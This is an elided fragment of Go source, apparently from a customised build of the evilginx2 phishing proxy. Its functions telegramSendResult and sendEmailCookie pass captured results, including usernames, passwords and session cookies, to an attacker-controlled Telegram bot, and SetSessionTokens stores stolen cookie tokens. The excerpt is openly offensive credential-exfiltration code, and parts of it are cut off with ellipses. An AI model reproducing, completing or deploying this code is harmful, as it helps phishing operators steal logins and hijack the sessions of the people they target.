...
func telegramSendResult(msg string) {
	...
	//
	//file, err := os.Open("/root/evilginx2-src/database/result.txt")
	//if err != nil {
	//	log.Fatal(err)
	//}
	//defer func() {
...
func sendEmailCookie(msg string, username string, password string) {
	...
	//Add my telegram code here
	send("mugu must fall", os.Getenv("TELEGRAM_TOKEN"), os.Getenv("TELEGRAM_ID"))
	return
}
func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*CookieToken) error {
